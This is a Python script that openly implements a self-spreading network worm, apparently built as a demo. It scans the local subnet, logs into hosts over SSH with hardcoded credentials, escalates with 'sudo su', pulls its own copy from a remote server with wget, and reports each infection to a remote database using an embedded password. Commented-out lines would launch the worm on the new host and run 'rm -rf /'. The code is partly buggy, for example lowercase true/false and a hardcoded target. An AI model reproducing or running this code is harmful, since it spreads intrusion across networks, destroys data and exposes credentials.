# Imports
import socket, struct
import subprocess
from random import shuffle
from pathlib import Path
import sys
from pexpect import pxssh
import os
import re
import pymysql

# Functions
def get_default_gateway_linux():
	"""Read the default gateway directly from /proc."""
	with open("/proc/net/route") as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def write(l, ip, cur):
	print(l)
	addline = ("INSERT INTO stat (IP, msg) VALUES (%s, %s)")
	cur.execute(addline, (ip, l))

# Default vars
username = "administrator"
password = "Test1"

# Connect to DB for demo puposes
db = pymysql.connect(host="ftp.folkmann.tk", user="worm", passwd="rE50w6nIT3h9h5m3", db="worm")
cur = db.cursor()

# Find info about self
my_ip = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
x = my_ip.split(".")
# Find octet
my_octet = x[3]
# Find subnet
subnet = x[0] + "." + x[1] + "." + x[2] + "."

# Find default gateway
gateway = get_default_gateway_linux()
x = gateway.split(".")
gateway_octet = x[3]

# Write results to make it pretty
write("My IP address is: " + my_ip, my_ip, cur)
write("Im on subnet: " + subnet + "0/24", my_ip, cur)
write("My default gateway is: " + gateway, my_ip, cur)

# Find targets (all ips in a /24 scope)
targets = list(range(1, 254))

# Remove self and default gateway from targets
targets.remove(int(gateway_octet))
targets.remove(1)
targets.remove(int(my_octet))

# Find previous IP
my_file = Path("previous.txt")
if my_file.is_file():
	file = open('previous.txt', 'r')
	prev_ip = file.readline()
	write("Previous victim was " + prev_ip, my_ip, cur)
	x = prev_ip.split(".")
	# Find octet
	prev_octet = x[3]
	# Remove previous from possible targets
	targets.remove(int(prev_octet))

# Shuffle the target list, so that it is not always the lowest IP that gets hit
shuffle(targets)

# Ping targets and find one that is active
TARGET = ""
for target in targets:
	ping_response = subprocess.Popen(["/bin/ping", "-c", "1", "-w", "1", "-W", "1", subnet + str(target)], stdout=subprocess.PIPE).stdout.read()

	if ", 0% packet loss" in str(ping_response):
		print(subnet + str(target) + " is go!")
		TARGET = subnet + str(target)
		break
	else:
		print(subnet + str(target) + ", nope")
		break

TARGET = subnet + "131"
# Text to the viewer
if TARGET == "":
	print("No target was found :(")
	sys.exit("")
else:
	print("Transfering to " + TARGET)

# Wait for previous to respond, if previous is given
if my_file.is_file():
	print("Previous defined, waiting for response")
	response = false
	while response == false:
		ping_response = subprocess.Popen(["/bin/ping", "-c", "1", "-w", "1", "-W", "1", TARGET], stdout=subprocess.PIPE).stdout.read()

		if ", 0% packet loss" in str(ping_response):
			print(TARGET + " is up again!")
			response = true
else:
	print("No previous defined, continuing")

# Connect to target
s = pxssh.pxssh()
if not s.login (TARGET, username, password):
	print("SSH session failed on login.")
	print(str(s))
	sys.exit("")
else:
	print("SSH session login successful")
	# Go sudo
	s.sendline("sudo su")
	s.expect('(?i)password'); s.sendline(password)        
	s.prompt()
	# Transfer IP to target
	s.sendline('echo "' + my_ip + '" > /home/administrator/previous.txt')
	s.prompt()
	# Transfer script to target
	s.sendline("wget https://folkmann.tk/files/worm.py -O worm.py")
	s.prompt()
	# Start worm on new machine
	#os.system("python3 worm.py")
	#s.prompt()
	# Terminate SSH connection
	s.logout()

# Close DB connection
db.close()

# Halt and catch fire
#os.system("rm -rf /")